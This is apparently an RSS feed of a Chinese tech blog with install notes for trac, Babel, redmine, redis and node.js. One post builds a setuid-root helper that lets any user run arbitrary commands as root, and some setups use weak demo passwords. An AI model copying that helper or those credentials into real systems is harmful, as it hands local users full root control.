<code>trac</code> 给人的第一感觉是太过于简单粗糙了。界面朴实简洁尚可接受、演示站点中文化不彻底、自已安装的时候较之 <code>redmine</code> 更是磕磕绊绊。=trac= 使用 <code>Babel</code> 进行多语言支持，当前的trac稳定版（1.0）存在中文支持方面的Bug：<a href="http://trac.edgewall.org/ticket/10903">Wrong `NullTranslations` class in functional tests</a> ，我在安装过程中就遇到了，正是这个问题才觉得先研究一下 <code>Babel</code> ，于是有了上一篇文章 《<a href="http://blog.kankanan.com/posts/2014/03/09_python5e94752856fd96455316ff1ababel.html">python应用国际化：Babel</a>》， <code>trac</code> 下一版（1.1）对这个问题进行了修复。 网络上有很多人对 <code>trac</code> 夸赞有加，另外 <code>trac</code> 还有持续集成的插件： <a href="http://bitten.edgewall.org/">Bitten</a> ， 在对 <code>Babel</code> 有一定了解后，我终于鼓气勇气研究起 <a href="http://trac.edgewall.org/">trac</a> 。
</p>

<div id="outline-container-orga79bb28" class="outline-2">
<h2 id="orga79bb28">安装最新版 <code>trac</code></h2>
<div class="outline-text-2" id="text-orga79bb28">
<ul class="org-ul">
<li><p>
使用学习 <code>Babel</code> 时建的虚拟环境
</p>

<div class="org-src-container">
<pre class="src src-sh">workon LearnBabel
</pre>
</div></li>

<li><p>
从最新源代码安装 <code>trac</code>
</p>

<div class="org-src-container">
<pre class="src src-sh">svn checkout http://svn.edgewall.org/repos/trac/trunk trac
<span style="color: #b294bb;">cd</span> trac
python ./setup.py install
</pre>
</div></li>

<li><p>
建一个项目看看效果
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">cd</span> ~/Examples/python
trac-admin LearnTrac initenv
tracd --port 8080 LearnTrac &amp;
xdg-open http://localhost:8080
</pre>
</div></li>
</ul>

<p>
感觉 <code>trac</code> 的中文化做得还不够彻底，但是关键的部位都已经中文化，不影响对整个系统的使用，有了 <code>Babel</code> 的经验之后对它进行中文化是很容易的，翻译后提交给 <code>trac</code> 开发人员，也算是回馈开源社区了。
</p>
</div>
</div>

<div id="outline-container-orge577d27" class="outline-2">
<h2 id="orge577d27">配置用户</h2>
<div class="outline-text-2" id="text-orge577d27">
<ul class="org-ul">
<li><p>
创建帐号文件 <code>LearnTrac/conf/users.digest</code>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #f0c674;">user</span>=admin
<span style="color: #f0c674;">realm</span>=localhost
<span style="color: #f0c674;">password</span>=admin
<span style="color: #f0c674;">file</span>=LearnTrac/conf/users.digest
<span style="color: #b294bb;">echo</span> ${<span style="color: #f0c674;">user</span>}:${<span style="color: #f0c674;">realm</span>}:$(<span style="color: #b294bb;">printf</span> <span style="color: #8abeb7;">"${user}:${realm}:${password}"</span> | md5sum - | sed -<span style="text-decoration: underline;">e </span><span style="color: #8abeb7; text-decoration: underline;">'s/\s\+-//'</span><span style="text-decoration: underline;">) &gt;&gt; ${</span><span style="color: #f0c674; text-decoration: underline;">file</span><span style="text-decoration: underline;">}</span>
</pre>
</div></li>

<li><p>
重新启动服务
</p>

<div class="org-src-container">
<pre class="src src-python">tracd -p 8080 --<span style="color: #f0c674;">auth</span>=<span style="color: #8abeb7;">"LearnTrac,LearnTrac/conf/users.digest,localhost"</span> LearnTrac
</pre>
</div></li>
</ul>

<p>
现在可以使用 <code>admin</code> 帐号登录了
</p>

<p>
帐号管理方面 <code>trac</code> 比较弱，只能通过 <code>trac-admin</code> 命令行工具来管理，小团队使用还是可以接受的，另外仅支持HTTP认证，配上HTTPS布署到外网也算是不错的选择。
</p>
</div>
</div>

<div id="outline-container-orgcdc2c78" class="outline-2">
<h2 id="orgcdc2c78">配置权限</h2>
<div class="outline-text-2" id="text-orgcdc2c78">
<ul class="org-ul">
<li><p>
为 <code>admin</code> 用户赋予管理员权限
</p>

<div class="org-src-container">
<pre class="src src-python">trac-admin LearnTrac permission add admin TRAC_ADMIN
</pre>
</div></li>
</ul>

<p>
现在可以在WEB界面上看到“管理”标签页了，可以在WEB界面上对权限进行配置。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[python应用国际化：Babel]]></title>
            <link>/article/python-5e94752856fd96455316ff1a-babel.html</link>
            <guid>/article/python-5e94752856fd96455316ff1a-babel.html</guid>
            <pubDate>Sun, 09 Mar 2014 11:54:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
<a href="http://babel.pocoo.org/">Babel</a> 是 <code>Python</code> 的一个国际化工具包，原本为 <a href="https://www.edgewall.org/">Edgewall.org</a> 下的一个项目，现在已
经转为由 <a href="http://pocoo.org">pocoo.org</a> 维护。
</p>

<div id="outline-container-org5eef107" class="outline-2">
<h2 id="org5eef107">统一管理 <code>Python</code> 虚拟环境</h2>
<div class="outline-text-2" id="text-org5eef107">
<div class="org-src-container">
<pre class="src src-sh">yaourt -S python-virtualenvwrapper
mkdir $<span style="color: #f0c674;">HOME</span>/.virtualenvs
<span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">'export WORKON_HOME=$HOME/.virtualenvs'</span> &gt;&gt; ~/.bashrc
<span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">'source virtualenvwrapper.sh'</span> &gt;&gt; ~/.bashrc
<span style="color: #b294bb;">source</span> ~/.bashrc
</pre>
</div>
</div>
</div>

<div id="outline-container-org798f903" class="outline-2">
<h2 id="org798f903">建立学习 <code>Babel</code> 专用虚拟环境</h2>
<div class="outline-text-2" id="text-org798f903">
<div class="org-src-container">
<pre class="src src-sh">mkvirtualenv --python=/usr/bin/python2 --no-site-packages LearnBabel
</pre>
</div>
</div>
</div>

<div id="outline-container-org0dd6a98" class="outline-2">
<h2 id="org0dd6a98">编译安装 <code>Babel</code></h2>
<div class="outline-text-2" id="text-org0dd6a98">
<div class="org-src-container">
<pre class="src src-sh">git clone https://github.com/mitsuhiko/babel.git
<span style="color: #b294bb;">cd</span> babel
pip install pytz
python setup.py import_cldr
pip install --editable .
</pre>
</div>
</div>
</div>

<div id="outline-container-org6ec8c7a" class="outline-2">
<h2 id="org6ec8c7a">常用信息国际化</h2>
<div class="outline-text-2" id="text-org6ec8c7a">
<pre class="example">
&gt;&gt;&gt; from babel import Locale
&gt;&gt;&gt; locale = Locale('en', 'US')
&gt;&gt;&gt; print locale.territories['CN']
China
&gt;&gt;&gt; locale = Locale('zh')
&gt;&gt;&gt; print locale.territories['CN']
中国
&gt;&gt;&gt; month_names = locale.months['format']['wide'].items()
&gt;&gt;&gt; for idx, name in sorted(month_names):
...   print name
... 
一月
二月
三月
四月
五月
六月
七月
八月
九月
十月
十一月
十二月
&gt;&gt;&gt; from datetime import date
&gt;&gt;&gt; from babel.dates import format_date
&gt;&gt;&gt; today = date.today()
&gt;&gt;&gt; print format_date(today, locale='zh')
2014年3月9日
</pre>
</div>
</div>

<div id="outline-container-orgb42b3d9" class="outline-2">
<h2 id="orgb42b3d9">任意信息国际化</h2>
<div class="outline-text-2" id="text-orgb42b3d9">
<ul class="org-ul">
<li><p>
创建python程序： <code>hello.py</code>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b5bd68;">import</span> gettext
gettext.bindtextdomain(<span style="color: #8abeb7;">'messages'</span>, <span style="color: #8abeb7;">'./hello.i18n'</span>)
<span style="color: #f0c674;">_</span> = gettext.gettext
<span style="color: #b5bd68;">print</span> _(<span style="color: #8abeb7;">'Hello'</span>)
</pre>
</div></li>

<li><p>
创建Babel配置文件： <code>hello.babel</code>
</p>

<pre class="example">
[python: hello.py]
</pre></li>

<li><p>
准备翻译成中文
</p>

<div class="org-src-container">
<pre class="src src-sh">mkdir hello.i18n
pybabel extract -F hello.babel . -o hello.i18n/messages.pot    <span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#20174;&#28304;&#20195;&#30721;&#20013;&#25552;&#21462;&#21487;&#32763;&#35793;&#30340;&#25991;&#26412;&#21040;P</span><span style="color: #969896; font-style: italic; text-decoration: underline;">OT&#65288;PO&#27169;&#26495;&#65289;&#25991;&#20214;</span>
pybabel init -l zh_CN -d ./hello.i18n -i ./hello.i18n/messages.pot    <span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#23558;POT&#25991;&#26412;&#25335;&#36125;</span><span style="color: #969896; font-style: italic; text-decoration: underline;">&#20986;&#19968;&#20221;&#25351;&#23450;&#35821;&#35328;&#30340;PO&#25991;&#20214;</span>
</pre>
</div></li>

<li><p>
译成中文后的PO文件： <code>./hello.i18n/zh_CN/LC_MESSAGES/messages.po</code>
</p>

<pre class="example">
# Chinese (Simplified, China) translations for PROJECT.
# Copyright (C) 2014 ORGANIZATION
# This file is distributed under the same license as the PROJECT project.
# FIRST AUTHOR &lt;EMAIL@ADDRESS&gt;, 2014.
#
#, fuzzy
msgid ""
msgstr ""
"Project-Id-Version: PROJECT VERSION\n"
"Report-Msgid-Bugs-To: EMAIL@ADDRESS\n"
"POT-Creation-Date: 2014-03-09 19:08+0800\n"
"PO-Revision-Date: 2014-03-09 19:12+0800\n"
"Last-Translator: FULL NAME &lt;EMAIL@ADDRESS&gt;\n"
"Language-Team: zh_Hans_CN &lt;LL@li.org&gt;\n"
"Plural-Forms: nplurals=2; plural=(n != 1)\n"
"MIME-Version: 1.0\n"
"Content-Type: text/plain; charset=utf-8\n"
"Content-Transfer-Encoding: 8bit\n"
"Generated-By: Babel 2.0-dev\n"

#: hello.py:1
msgid "Hello"
msgstr "喂"

</pre></li>

<li><p>
编译翻译结果
</p>

<div class="org-src-container">
<pre class="src src-sh">pybabel compile -f -d ./hello.i18n    <span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">&#32534;&#35793;PO&#25991;&#20214;&#20026;MO&#25991;&#20214;</span>
</pre>
</div></li>

<li><p>
英文环境下运行程序
</p>

<pre class="example">
python ./hello.py
Hello
</pre></li>

<li><p>
中文环境下运行程序
</p>

<pre class="example">
LC_ALL=zh_CN python ./hello.py
喂
</pre></li>

<li>更新 <code>hello.py</code> ，追加一句“      print _('World')”</li>

<li><p>
将“World”翻译成中文
</p>

<div class="org-src-container">
<pre class="src src-sh">pybabel extract -F hello.babel . -o hello.i18n/messages.pot    <span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#20174;&#28304;&#20195;&#30721;&#20013;&#25552;&#21462;&#21487;&#32763;&#35793;&#30340;&#25991;&#26412;&#21040;P</span><span style="color: #969896; font-style: italic; text-decoration: underline;">OT&#65288;PO&#27169;&#26495;&#65289;&#25991;&#20214;</span>
pybabel update -l zh_CN -d ./hello.i18n -i ./hello.i18n/messages.pot    <span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#20174;POT&#25991;&#26412;</span><span style="color: #969896; font-style: italic; text-decoration: underline;">&#26356;&#26032;&#25351;&#23450;&#35821;&#35328;&#30340;PO&#25991;&#20214;</span>
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#24320;&#22987;&#32763;&#35793;&#25351;&#23450;&#35821;&#35328;&#30340;PO&#25991;&#20214;&#65306; hello.i18n/zh_CN/LC_MESSAGES/messages.po</span>
pybabel compile -f -d ./hello.i18n    <span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">&#32534;&#35793;PO&#25991;&#20214;&#20026;MO&#25991;&#20214;</span>
</pre>
</div></li>

<li><p>
再次运行
</p>

<pre class="example">
LC_ALL=zh_CN python ./hello.py
喂
世界
</pre></li>

<li><p>
程序中强制使用中文语言： <code>hello.cn.py</code>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b5bd68;">import</span> gettext

<span style="color: #f0c674;">t</span> = gettext.translation(<span style="color: #8abeb7;">'messages'</span>, <span style="color: #8abeb7;">'./hello.i18n'</span>, languages=[<span style="color: #8abeb7;">'zh_CN'</span>])
<span style="color: #f0c674;">_</span> = t.gettext

<span style="color: #b5bd68;">print</span> _(<span style="color: #8abeb7;">'Hello'</span>)
<span style="color: #b5bd68;">print</span> _(<span style="color: #8abeb7;">'World'</span>)
</pre>
</div></li>

<li><p>
即使是在英文环境下也输出中文
</p>

<pre class="example">
LC_ALL=en_US python ./hello.py
喂
世界
</pre></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[CentOS 6.4下安装redmine]]></title>
            <link>/article/centos-6.4-4e0b5b8988c5-redmine.html</link>
            <guid>/article/centos-6.4-4e0b5b8988c5-redmine.html</guid>
            <pubDate>Fri, 07 Mar 2014 06:17:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
本文为CentOS 6.4下安装redmine-2.5.0的笔记，按照 <a href="http://www.redmine.org/projects/redmine/wiki/RedmineInstall">官方文档</a> 进行安装。
</p>

<div id="outline-container-org74ea1be" class="outline-2">
<h2 id="org74ea1be">安装 <code>ruby</code></h2>
<div class="outline-text-2" id="text-org74ea1be">
<div class="org-src-container">
<pre class="src src-sh">yum install ruby
yum install ruby-devel
yum install rubygems
</pre>
</div>
</div>
</div>

<div id="outline-container-org7c35e28" class="outline-2">
<h2 id="org7c35e28">安装 <code>redmine</code></h2>
<div class="outline-text-2" id="text-org7c35e28">
<div class="org-src-container">
<pre class="src src-sh">wget <span style="color: #8abeb7;">'http://www.redmine.org/releases/redmine-2.5.0.tar.gz'</span>
tar xzvf redmine-2.5.0.tar.gz
gem install bundler
gem install mysql2.
yum install ImageMagick ImageMagick-devel
bundle install --without development test<span style="color: #373b41; background-color: #de935f;">  </span>
</pre>
</div>
</div>
</div>

<div id="outline-container-org160f3d6" class="outline-2">
<h2 id="org160f3d6">配置 <code>redmine</code></h2>
<div class="outline-text-2" id="text-org160f3d6">
<ul class="org-ul">
<li><p>
以 root 用户登录 <code>mysql</code>
</p>

<div class="org-src-container">
<pre class="src src-sh">mysql -uroot -p
</pre>
</div></li>

<li><p>
创建 <code>redmine</code> 用户及库
</p>

<div class="org-src-container">
<pre class="src src-sql"><span style="color: #b5bd68;">CREATE</span> DATABASE redmine <span style="color: #81a2be;">CHARACTER</span> <span style="color: #b5bd68;">SET</span> utf8;
<span style="color: #b5bd68;">CREATE</span> <span style="color: #b294bb;">USER</span> <span style="color: #8abeb7;">'redmine'</span>@<span style="color: #8abeb7;">'localhost'</span> IDENTIFIED <span style="color: #b5bd68;">BY</span> <span style="color: #8abeb7;">'redmine'</span>;
<span style="color: #b5bd68;">GRANT</span> <span style="color: #b5bd68;">ALL</span> <span style="color: #b5bd68;">PRIVILEGES</span> <span style="color: #b5bd68;">ON</span> redmine.* <span style="color: #b5bd68;">TO</span> <span style="color: #8abeb7;">'redmine'</span>@<span style="color: #8abeb7;">'localhost'</span>;
</pre>
</div></li>

<li><p>
修改数据库配置文件
</p>

<div class="org-src-container">
<pre class="src src-sh">cp config/database.yml.example config/database.yml
diff config/database.yml config/database.yml.example
10,11c10,11
&lt;   username: redmine
&lt;   password: <span style="color: #8abeb7;">"redmine"</span>
---
&gt;   username: root
&gt;   password: <span style="color: #8abeb7;">""</span>
</pre>
</div></li>

<li><p>
初始化会话存储
</p>

<div class="org-src-container">
<pre class="src src-sh">rake generate_secret_token
</pre>
</div></li>

<li><p>
创建数据库表结构
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #f0c674;">RAILS_ENV</span>=production rake db:migrate
</pre>
</div></li>

<li><p>
解决上一步可能出现的错误
</p>

<blockquote>
<p>
rake aborted!
Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)
</p>

<p>
Tasks: TOP =&gt; db:migrate =&gt; environment
</p>
</blockquote>

<p>
确定 <code>mysql</code> 启动时指定的 <code>mysql.sock</code> 文件的路径
</p>

<div class="org-src-container">
<pre class="src src-sh">ps aux | grep mysql.sock
</pre>
</div>

<p>
显示的 <code>mysql.sock</code> 路径可能为“ <code>--socket=/tmp/mysql.sock</code> ”
</p>

<p>
修改 <code>redmine</code> 数据库配置，在 <code>production</code> 配置中添加 <code>socket</code> 项：
</p>

<pre class="example">
production:
  ...
  socket: /tmp/mysql.sock
</pre>

<p>
重新进行上一步操作。
</p></li>

<li><p>
初始化数据
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #f0c674;">RAILS_ENV</span>=production <span style="color: #f0c674;">REDMINE_LANG</span>=zh rake redmine:load_default_data
</pre>
</div></li>

<li><p>
创建相关目录
</p>

<div class="org-src-container">
<pre class="src src-sh">mkdir -p tmp tmp/pdf public/plugin_assets
sudo chown -R nobody:nobody files log tmp public/plugin_assets
sudo chmod -R 755 files log tmp public/plugin_assets
</pre>
</div></li>
</ul>
</div>
</div>

<div id="outline-container-org71144bd" class="outline-2">
<h2 id="org71144bd">试运行 <code>redmine</code></h2>
<div class="outline-text-2" id="text-org71144bd">
<div class="org-src-container">
<pre class="src src-sh">ruby script/rails server webrick -e production
</pre>
</div>

<ul class="org-ul">
<li><p>
浏览器打开页面
</p>

<p>
<a href="http://localhost:3000">http://localhost:3000</a>
</p>

<p>
使用 用户名 <code>admin</code> ，密码 <code>admin</code> 登录后，立即修改密码。
</p>

<p>
使用下面的命令生成随机的密码：
</p>

<div class="org-src-container">
<pre class="src src-sh">cat /dev/urandom | head -1 | md5sum | head -c 8
</pre>
</div></li>
</ul>
</div>
</div>

<div id="outline-container-orgaaa52a5" class="outline-2">
<h2 id="orgaaa52a5">配置 <code>redmine</code></h2>
<div class="outline-text-2" id="text-orgaaa52a5">
<ul class="org-ul">
<li>修改 <code>config/settings.yml</code></li>
</ul>
</div>
</div>

<div id="outline-container-org5b35950" class="outline-2">
<h2 id="org5b35950">使用 <code>Nginx</code> 和 <code>passenger</code></h2>
<div class="outline-text-2" id="text-org5b35950">
<div class="org-src-container">
<pre class="src src-sh">wget <span style="color: #8abeb7;">'http://nginx.org/download/nginx-1.4.6.tar.gz'</span>
tar xzvf nginx-1.4.6.tar.gz
gem install passenger
yum install pcre-devel
passenger-install-nginx-module
</pre>
</div>

<ul class="org-ul">
<li>交互式安装过程

<ul class="org-ul">
<li><p>
Automatically download and install Nginx?
</p>

<p>
选 2. No: I want to customize my Nginx installation. (for advanced users)
</p></li>

<li><p>
Where is your Nginx source code located?
</p>

<p>
填解压的 <code>nginx</code> 源码包路径
</p></li>

<li><p>
Where do you want to install Nginx to?
</p>

<p>
填 <code>/usr/local/nginx</code>
</p></li>
</ul></li>

<li><p>
修改 /usr/local/nginx/conf/nginx.conf
</p>

<p>
在最后的 <code>}</code> 前添加以下配置
</p>

<pre class="example">
include vhosts/*.conf;
</pre></li>

<li><p>
添加站点配置文件 <code>/usr/local/nginx/conf/vhosts/redmine.conf</code>
</p>

<pre class="example">
server {
  listen  80;
  server_name &lt;域名&gt;;
  root &lt;redmine根目录&gt;/public;
  passenger_enabled on;
  client_max_body_size 10m; # Max attachemnt size
}
</pre></li>

<li><p>
启动 <code>nginx</code>
</p>

<div class="org-src-container">
<pre class="src src-sh">/usr/local/nginx/sbin/nginx
</pre>
</div></li>

<li><p>
现在可以正式访问站点了
</p>

<p>
<a href="http://">http://</a>&lt;域名&gt;
</p></li>
</ul>
</div>
</div>

<div id="outline-container-org7f2896d" class="outline-2">
<h2 id="org7f2896d">支持 <code>OpenID</code> 第三方帐号登录</h2>
<div class="outline-text-2" id="text-org7f2896d">
<ul class="org-ul">
<li><p>
安装 <code>openid</code> 库
</p>

<div class="org-src-container">
<pre class="src src-sh">gem install ruby-openid
</pre>
</div></li>

<li>使用 <code>admin</code> 帐号登录系统，在“管理 - 配置 - 认证”中勾选上“允许使用OpenID登录和注册”。</li>

<li>用户注册时“密码”可以省略， 填上 <code>OpenID URL</code> 即可。</li>

<li><p>
如何获得Google的OpenID URL？
</p>

<ul class="org-ul">
<li>先在 <code>Google</code> 的站点上登录</li>
<li>打开 <a href="https://profiles.google.com">https://profiles.google.com</a> 后会跳转到类似这样（ <code>https://plus.google.com/000000000000000000000/posts</code> ）的网页</li>
<li>你的 <code>OpenID URL</code> 为 <a href="http://profiles.google.com/000000000000000000000">http://profiles.google.com/000000000000000000000</a></li>
</ul>

<p>
上面的 <code>000000000000000000000</code> 可能为任意的数字串
</p></li>

<li><p>
管理员确认注册后即可在登录界面上输入 <code>OpenID URL</code> 直接登录
</p>

<p>
一般浏览器的输入框是有记忆功能的，双击后会出现输入历史下拉列表，直接选择即可。
</p></li>

<li><p>
安装插件简化 <code>OpenID</code> 登录
</p>

<ul class="org-ul">
<li><a href="https://github.com/jorgebg/redmine-openid-selector">https://github.com/jorgebg/redmine-openid-selector</a> （不推荐） 为原始分枝，在 <code>redmine-2.5.0</code> 下不能直接安装会导致站点登录界面出现404错误，解决方案在 <a href="http://www.redmine.org/boards/3/topics/34327?r=38778#message-38778">这里</a> ，简而言之就是把插件目录名中的 <code>-</code> 改为 <code>_</code> 。</li>

<li><a href="https://github.com/computerminds/redmine_openid_selector">https://github.com/computerminds/redmine_openid_selector</a> （不推荐） 这个分枝安装后可用，但界面为英文（其实界面就一句英文）。</li>

<li><a href="https://github.com/tangxinfa/redmine_openid_selector">https://github.com/tangxinfa/redmine_openid_selector</a> （推荐） 为支持中文我fork了上一个分枝。</li>

<li><p>
通用的插件安装过程：
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">cd</span> plugins
git clone https://github.com/tangxinfa/redmine_openid_selector.git
rake redmine:plugins:migrate <span style="color: #f0c674;">RAILS_ENV</span>=production
touch tmp/restart.txt
</pre>
</div></li>

<li><p>
通用的插件卸载过程：
</p>

<div class="org-src-container">
<pre class="src src-sh">rake redmine:plugins:migrate <span style="color: #f0c674;">NAME</span>=redmine-openid-selector <span style="color: #f0c674;">VERSION</span>=0 <span style="color: #f0c674;">RAILS_ENV</span>=pr<span style="text-decoration: underline;">oduction</span>
rm -rf plugins/redmine-openid-selector
touch tmp/restart.txt
</pre>
</div></li>
</ul>

<p>
现在在登录及注册页面直接点击第三方站点Logo即可。
</p></li>
</ul>
</div>
</div>

<div id="outline-container-orgcf84f83" class="outline-2">
<h2 id="orgcf84f83">样式美化</h2>
<div class="outline-text-2" id="text-orgcf84f83">
<div class="org-src-container">
<pre class="src src-sh">git clone git://github.com/pixel-cookers/redmine-theme.git public/themes/pixel-c<span style="text-decoration: underline;">ookers</span>
touch tmp/restart.txt
</pre>
</div>

<p>
现在可以使用 <code>admin</code> 登录后台，在“管理 - 配置 - 显示 - 主题”中启用主题 <code>Pixel-cookers</code> 。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[编译安装redis]]></title>
            <link>/article/7f168bd15b8988c5-redis.html</link>
            <guid>/article/7f168bd15b8988c5-redis.html</guid>
            <pubDate>Mon, 17 Feb 2014 08:40:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org27d5a1d" class="outline-2">
<h2 id="org27d5a1d">下载</h2>
<div class="outline-text-2" id="text-org27d5a1d">
<p>
到 <a href="http://redis.io/download">http://redis.io/download</a> 下载最新稳定版本。
</p>
</div>

<div id="outline-container-org6af5fa2" class="outline-3">
<h3 id="org6af5fa2">安装</h3>
<div class="outline-text-3" id="text-org6af5fa2">
<p>
解压后参照 README 进行安装：
</p>

<div class="org-src-container">
<pre class="src src-sh">make
make install
</pre>
</div>

<p>
默认安装到/usr/local。
</p>

<p>
指定位置安装： 
</p>

<div class="org-src-container">
<pre class="src src-sh">make <span style="color: #f0c674;">PREFIX</span>=/usr/local/redis install
</pre>
</div>

<p>
安装的程序：
</p>

<dl class="org-dl">
<dt>/usr/local/bin/redis-cli</dt><dd>redis客户端程序</dd>
<dt>/usr/local/bin/redis-server</dt><dd>redis服务器程序</dd>
</dl>
</div>
</div>

<div id="outline-container-orge0c4958" class="outline-3">
<h3 id="orge0c4958">手工配置</h3>
<div class="outline-text-3" id="text-orge0c4958">
<p>
将源码包附带的配置文件 <code>redis.conf</code> 拷贝到安装位置:
</p>

<div class="org-src-container">
<pre class="src src-sh">mkdir /usr/local/redis/etc/
cp ./redis.conf /usr/local/redis/etc/
</pre>
</div>

<p>
修改配置文件 <code>redis.conf</code> :
</p>

<pre class="example">
daemonize yes
pidfile /usr/local/redis/var/redis.pid
logfile /usr/local/redis/var/redis.log
dir /usr/local/redis/data
stop-writes-on-bgsave-error no
bind 127.0.0.1
</pre>

<ul class="org-ul">
<li><p>
启动
</p>

<div class="org-src-container">
<pre class="src src-sh">/usr/local/redis/bin/redis-server /usr/local/redis/etc/redis.conf
</pre>
</div></li>

<li><p>
停止
</p>

<p>
使用redis客户端中执行shutdown命令
</p>

<div class="org-src-container">
<pre class="src src-sh">redis-cli
shutdown
</pre>
</div></li>
</ul>
</div>
</div>

<div id="outline-container-org57f59dd" class="outline-3">
<h3 id="org57f59dd">自动配置</h3>
<div class="outline-text-3" id="text-org57f59dd">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">cd</span> utils
./install_server.sh
</pre>
</div>

<p>
redis 安装在非标准路径时，安装脚本可能找不到 redis 可执行程序路径，需要填写：
</p>

<pre class="example">
Please select the redis executable path [] /usr/local/redis/bin/redis-server
</pre>

<p>
该安装脚本会生成平台相关的 redis 服务启动脚本，启动 redis 服务，同时设置为开机启动。</p>
</div>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[编译安装node.js]]></title>
            <link>/article/7f168bd15b8988c5-node.js.html</link>
            <guid>/article/7f168bd15b8988c5-node.js.html</guid>
            <pubDate>Mon, 17 Feb 2014 08:23:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
下载
</p>

<p>
node.js是一个新兴的开发平台，版本更新非常活跃，因此应该尽量下载安装最新的版本。
</p>

<p>
到 <a href="http://nodejs.org/">http://nodejs.org/</a> 下载最新的版本。
</p></li>

<li><p>
安装
</p>

<p>
解压后参照 README.md 进行安装：
</p>

<div class="org-src-container">
<pre class="src src-sh">./configure
make
make install
</pre>
</div></li>

<li><p>
安装后
</p>

<p>
默认安装到/usr/local。
</p>

<dl class="org-dl">
<dt>/usr/local/bin/node</dt><dd>node主程序</dd>
<dt>/usr/local/bin/npm</dt><dd>node模块管理程序</dd>
<dt>/usr/local/lib/node_modules</dt><dd>node全局模块目录</dd>
</dl>

<p>
像一些需要全局安装的模块也会把文件安装在/usr/local目录下。
</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[express.js中如何在第一次请求的响应中取得connect.sid]]></title>
            <link>/article/express.js-4e2d59824f5557287b2c4e006b218bf76c42768454cd5e944e2d53d65f97-connect.sid.html</link>
            <guid>/article/express.js-4e2d59824f5557287b2c4e006b218bf76c42768454cd5e944e2d53d65f97-connect.sid.html</guid>
            <pubDate>Fri, 14 Feb 2014 15:34:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在web页面通过iframe跨域登录访问服务的情况下，是不方便取cookie中的sessionid的，于是想到将sessionid直接放到响应体中，
这就需要在node.js中直接获取connect.sid这个cookie值，一开始想当然地以为系统（使用的是passport.js）会在登录认证通过后
执行res.cookie('connect.sid', &#x2026;)进行设置，就想直接从res的Set-Cookie头解析出设置的值，结果发现这个cookie压根不存在，
甚至在库代码中搜索cookie都不管用，着实急得人直抓头。最后dump出res后确在req中见到了connect.sid值的影子：req.sessionID，
然后在 <a href="http://stackoverflow.com/questions/13693101/express-sessionid-differs-from-sessionid-in-cookie">《Express SessionID differs from SessionID in Cookie》</a> 中找到了从req.sessionID计算出connect.sid的方法：
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">signature</span> = require(<span style="color: #8abeb7;">'express/node_modules/cookie-signature'</span>);
<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">connectSid</span> = <span style="color: #8abeb7;">'s:'</span> + signature.sign(req.sessionID, sessionOptions.secret);
</pre>
</div>

<p>
其实，connect.sid这个cookie是在请求到来后在req上设置的（不存在则设置），不管有没有登录都会设置。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux下允许普通用户执行需要root权限的命令]]></title>
            <link>/article/linux-4e0b51418bb8666e901a752862376267884c97008981-root-674396507684547d4ee4.html</link>
            <guid>/article/linux-4e0b51418bb8666e901a752862376267884c97008981-root-674396507684547d4ee4.html</guid>
            <pubDate>Thu, 26 Dec 2013 07:44:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
最典型的情况是要实现一个通过web界面重启系统的功能，通常为了安全会以非root用户身份（通常是nobody）运行服务端脚本，这样脚本中就不能执行危险操作了。
</p>

<p>
下面的c工具程序可以允许任意用户执行需要root权限的命令：
</p>

<p>
<a href="../static/as_root.c">as_root.c</a>
</p>

<p>
编译：
</p>
<div class="org-src-container">
<pre class="src src-sh">gcc -g as_root.c -o as_root
</pre>
</div>

<p>
配置：
</p>
<div class="org-src-container">
<pre class="src src-sh">chown root:root ./as_root; chmod 4755 ./as_root
</pre>
</div>

<p>
运行：
</p>
<div class="org-src-container">
<pre class="src src-sh">sudo -u <span style="color: #8abeb7;">"nobody"</span> ./as_root <span style="color: #8abeb7;">"reboot"</span>
</pre>
</div>

<p>
参考：<a href="http://blog.tianya.cn/blogger/post_show.asp?BlogID=126326&amp;PostID=1629441">如何在普通用户下执行一些需要root用户执行的命令</a></p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Discuz访问推广任务反作弊]]></title>
            <link>/article/discuz-8bbf95ee63a85e7f4efb52a153cd4f5c5f0a.html</link>
            <guid>/article/discuz-8bbf95ee63a85e7f4efb52a153cd4f5c5f0a.html</guid>
            <pubDate>Thu, 19 Dec 2013 17:02:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
识别作弊
</p>

<p>
